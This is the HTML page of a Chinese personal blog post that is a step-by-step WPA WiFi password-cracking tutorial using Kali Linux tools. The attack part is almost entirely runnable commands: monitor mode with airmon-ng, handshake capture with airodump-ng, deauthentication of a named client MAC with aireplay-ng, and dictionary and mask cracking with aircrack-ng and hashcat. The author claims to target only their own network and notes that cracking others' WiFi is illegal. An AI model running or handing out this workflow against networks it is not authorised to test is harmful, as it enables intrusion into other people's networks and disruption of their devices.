@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"kulove.cc","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="起因是最近买了个Wifi Pineapple，感觉无线安全挺有意思，再加上网上破解Wifi的教程要么跑不起来、要么不是很详细，所以就准备写这篇文章。  前期准备 1.支持监听模式的无线网卡，我这里是小米的无线网卡 2.Kali Linux，我这里是VMware虚拟机   挂载网卡   下载密码字典 12curl -L -o rockyou.txt https:&#x2F;&#x2F;github.com&#x2F;brann">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux 高效破解Wifi密码">
+<meta property="og:url" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/index.html">
+<meta property="og:site_name" content="Louis Blog">
+<meta property="og:description" content="起因是最近买了个Wifi Pineapple，感觉无线安全挺有意思，再加上网上破解Wifi的教程要么跑不起来、要么不是很详细，所以就准备写这篇文章。  前期准备 1.支持监听模式的无线网卡，我这里是小米的无线网卡 2.Kali Linux，我这里是VMware虚拟机   挂载网卡   下载密码字典 12curl -L -o rockyou.txt https:&#x2F;&#x2F;github.com&#x2F;brann">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/0.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/1.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/2.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/3.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/4.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/5.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/6.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/7.png">
+<meta property="og:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/8.png">
+<meta property="article:published_time" content="2018-10-22T10:02:30.000Z">
+<meta property="article:modified_time" content="2020-02-22T09:37:31.424Z">
+<meta property="article:author" content="Louis Yang">
+<meta property="article:tag" content="破解">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/0.png">
+
+<link rel="canonical" href="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>Kali Linux 高效破解Wifi密码 | Louis Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-108067514-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-108067514-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Louis Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Louis Yang">
+      <meta itemprop="description" content="程序猿一枚，偶尔写写故事、搞搞安全。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Louis Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kali Linux 高效破解Wifi密码
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-10-22 18:02:30" itemprop="dateCreated datePublished" datetime="2018-10-22T18:02:30+08:00">2018-10-22</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/10/22/Kali-Linux-高效破解Wifi密码/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>起因是最近买了个Wifi Pineapple，感觉无线安全挺有意思，再加上网上破解Wifi的教程要么跑不起来、要么不是很详细，所以就准备写这篇文章。</p>
+</blockquote>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><blockquote>
+<p>1.支持监听模式的无线网卡，我这里是小米的无线网卡</p>
+<p>2.Kali Linux，我这里是VMware虚拟机</p>
+</blockquote>
+<ol>
+<li><p>挂载网卡</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/0.png" alt="pic"></p>
+</li>
+<li><p>下载密码字典</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> 比较常用的密码字典，不是很大，国内Wifi成功率不会很高</span></span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><ol>
+<li><p>检查网卡是否支持监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng</span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现为wlan0的网卡则支持</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开启</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 开启后名称变成了wlan0mon</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索附近的网络</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里使用自己的Wifi作为对象，私自破解他人Wifi属于违法行为</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/1.png" alt="pic"></p>
+</li>
+<li><p>抓取握手包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng -c 11 --bssid 74:7D:24:77:2B:6F -w ~/ wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -c 为信道，这里主要是需要包含密码信息的数据包</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/2.png" alt="pic"></p>
+</li>
+<li><p>攻击，使目标设备断开重新连接，以便获取握手包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -0 2 -a 74:7D:24:77:2B:6F -c 84:89:AD:6F:60:6F wlan0mon</span><br><span class="line"><span class="meta">#</span><span class="bash"> -a Wifi热点的BSSID -c 攻击设备的MAC地址</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/3.png" alt="pic"></p>
+</li>
+<li><p>耐心等待设备重新连接以抓取认证数据包</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/4.png" alt="pic"></p>
+<blockquote>
+<p>成功后可终止命令。</p>
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/5.png" alt="pic"></p>
+</blockquote>
+</li>
+<li><p>暴力破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -a2 -b 74:7D:24:77:2B:6F -w rockyou.txt ~/*.cap</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/6.png" alt="pic"></p>
+<blockquote>
+<p>这里已经破解成功了，由于自己的密码并不是很复杂，所以很快就完成了破解，实际使用中使用这个密码字典成功率不会很高，需要使用更大的字典才行。</p>
+<p>但更大的字典意味着破解速度会被无限拉长。。</p>
+<p>所以下面使用Hashcat来破解密码，实际测试下来，速度确实快了几倍。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="使用Hashcat破解"><a href="#使用Hashcat破解" class="headerlink" title="使用Hashcat破解"></a>使用Hashcat破解</h2><blockquote>
+<p>官方介绍是：Hashcat是当前速度最快、最先进的开源密码恢复工具。</p>
+<p>我这边测试的是使用GPU破解，所以将环境转移到了Windows下。</p>
+</blockquote>
+<ol>
+<li><p>格式转换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat-utils/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载转换工具，将<span class="built_in">cap</span>文件转换为hccapx文件</span></span><br><span class="line"> ./cap2hccapx.exe -01.cap 01.hccapx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/7.png" alt="pic"></p>
+</li>
+<li><p>使用密码字典破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hashcat/hashcat/releases</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载 Hashcat，开始破解</span></span><br><span class="line"> .\hashcat64.exe -m 2500 01.hccapx .\rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/8.png" alt="pic"></p>
+<blockquote>
+<p>完成，速度超快！</p>
+</blockquote>
+</li>
+<li><p>使用掩码破解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 知道密码长度使用此模式还行，如果不知道。。</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx -1 ?l?d ?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line">1 ?l?u ?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 指定11位</span></span><br><span class="line">.\hashcat64.exe -m 2500 -a 3 01.hccapx --increment --increment-min=8 --increment-max=15 -1 ?a ?1?1?1?1?1?1?1?1?1?1?1?1?1?1</span><br><span class="line"><span class="meta">#</span><span class="bash"> 从8位破解到15位,超高难度</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 显卡不行，所以就不测试该模式的时间了</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>常见问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Device #1: WARNING! Kernel exec timeout is not disabled.</span><br><span class="line">             This may cause &quot;CL_OUT_OF_RESOURCES&quot; or related errors.</span><br><span class="line">             To disable the timeout, see: https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch</span><br><span class="line">           </span><br><span class="line"># 参考 https:&#x2F;&#x2F;hashcat.net&#x2F;q&#x2F;timeoutpatch 新建 wddm_timeout_patch.reg 文件，内容如下，保存后双击运行导入注册表。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers]</span><br><span class="line">&quot;TdrLevel&quot;&#x3D;dword:00000000</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%A0%B4%E8%A7%A3/" rel="tag"># 破解</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/10/11/%E4%B8%80%E5%85%86%E9%9F%A6%E5%BE%B7%E7%9A%84%E6%97%A0%E8%80%BB%E5%A5%97%E8%B7%AF/" rel="prev" title="一兆韦德的无耻套路">
+      <i class="fa fa-chevron-left"></i> 一兆韦德的无耻套路
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/11/15/%E8%B5%B0%E5%87%BA%E8%88%92%E9%80%82%E5%8C%BA-%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%A6%BB%E8%81%8C/" rel="next" title="走出舒适区 - 记一次离职">
+      走出舒适区 - 记一次离职 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前期准备"><span class="nav-number">1.</span> <span class="nav-text">前期准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始破解"><span class="nav-number">2.</span> <span class="nav-text">开始破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用Hashcat破解"><span class="nav-number">3.</span> <span class="nav-text">使用Hashcat破解</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Louis Yang</p>
+  <div class="site-description" itemprop="description">程序猿一枚，偶尔写写故事、搞搞安全。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kulovecc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kulovecc" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@kulove.cc" title="E-Mail → mailto:admin@kulove.cc"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://instagram.com/kulovecc" title="Instagram → https:&#x2F;&#x2F;instagram.com&#x2F;kulovecc" rel="noopener" target="_blank"><i class="fa fa-fw fa-instagram"></i>Instagram</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Louis Yang</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://kulove-cc.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+<script>
+  var disqus_config = function() {
+    this.page.url = "http://kulove.cc/2018/10/22/Kali-Linux-%E9%AB%98%E6%95%88%E7%A0%B4%E8%A7%A3Wifi%E5%AF%86%E7%A0%81/";
+    this.page.identifier = "2018/10/22/Kali-Linux-高效破解Wifi密码/";
+    this.page.title = "Kali Linux 高效破解Wifi密码";
+    };
+  NexT.utils.loadComments(document.querySelector('#disqus_thread'), () => {
+    if (window.DISQUS) {
+      DISQUS.reset({
+        reload: true,
+        config: disqus_config
+      });
+    } else {
+      var d = document, s = d.createElement('script');
+      s.src = 'https://kulove-cc.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', '' + +new Date());
+      (d.head || d.body).appendChild(s);
+    }
+  });
+</script>
+
+</body>
+</html>
